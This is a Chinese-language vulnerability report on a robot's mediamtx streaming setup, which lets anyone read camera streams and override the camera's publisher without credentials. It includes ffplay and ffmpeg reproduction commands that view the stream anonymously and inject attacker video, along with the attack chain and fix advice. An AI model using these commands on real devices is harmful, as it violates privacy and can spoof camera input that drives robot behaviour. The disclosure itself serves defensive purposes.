## 1. 漏洞概述

机器人出厂 mediamtx 配置为**完全匿名**：

```yaml
authMethod: internal
authInternalUsers:
- user: any          # 匿名用户
  pass:
  ips: []            # 任意 IP
  permissions:
  - action: publish  # 允许发布
    path:            # 任意路径
  - action: read     # 允许读取
  - action: playback
...
overridePublisher: yes
```

且摄像头推流链路为 `ffmpeg → rtsp://127.0.0.1:8554/<camera_name>`（v4l2 采集 → h264 编码发布）。

后果（与云深处 Lite3 同款 CRITICAL）：
1. **匿名驱逐摄像头**：`overridePublisher: yes` 下，任何人向同一路径 ANNOUNCE 即可
   顶掉现有发布者（摄像头），注入攻击者视频；
2. **匿名读取直播**：任何人可拉流看实时画面（隐私泄露）；
3. **视频内容注入**：若下游有视觉跟随/AI 逻辑（如人物跟随），攻击者视频可直接
   驱动其判断 —— 可组合为视频控制链。

## 2. 攻击链

```
攻击者（同 WiFi）
   │ ffmpeg -i evil.mp4 -f rtsp rtsp://192.168.2.1:8554/<摄像头路径>
   │   （无需凭据：user:any + publish 权限）
   ▼
mediamtx overridePublisher:yes → 驱逐摄像头发布者
   ▼
攻击者视频成为该路径流源
   ├── 匿名读取者（App/监控）看到攻击者画面
   └── 下游视觉逻辑（跟随/检测）被攻击者内容驱动
```

## 3. 证据（固件配置）

- `evidence/mediamtx.yml`：完整配置（authInternalUsers: user any + publish/read + overridePublisher: yes）
- 摄像头推流：`galileo-rtsp/opt/bin/start_ffmpeg.py`（v4l2→h264→ rtsp://127.0.0.1:8554/<name>）
- 端口（实测 ss）：8554(RTSP)/1935(RTMP)/8887/8888/8889/8000/8001/8189/8890 全监听

## 4. 复现（网络恢复后验证）

```bash
# 匿名读取直播（验证无认证）
ffplay rtsp://192.168.2.1:8554/<camera_name>

# 匿名发布驱逐摄像头
ffmpeg -re -i evil.mp4 -c:v copy -f rtsp rtsp://192.168.2.1:8554/<camera_name>
```

（camera_name 可经 OPTIONS/DESCRIBE 或路径枚举获得）

## 5. 影响范围

- 摄像头直播任意人可看（隐私）；
- 摄像头被顶替（画面注入，欺骗操作者/AI）；
- 可组合视觉跟随逻辑形成物理运动影响。

## 6. 修复建议

1. `authInternalUsers` 移除 `user: any` 的 publish 权限，配置真实账号或
   `ips: ['127.0.0.1']` 仅允许本机 ffmpeg 发布；
2. `overridePublisher: no`；
3. read 权限按需收紧（或加认证）。
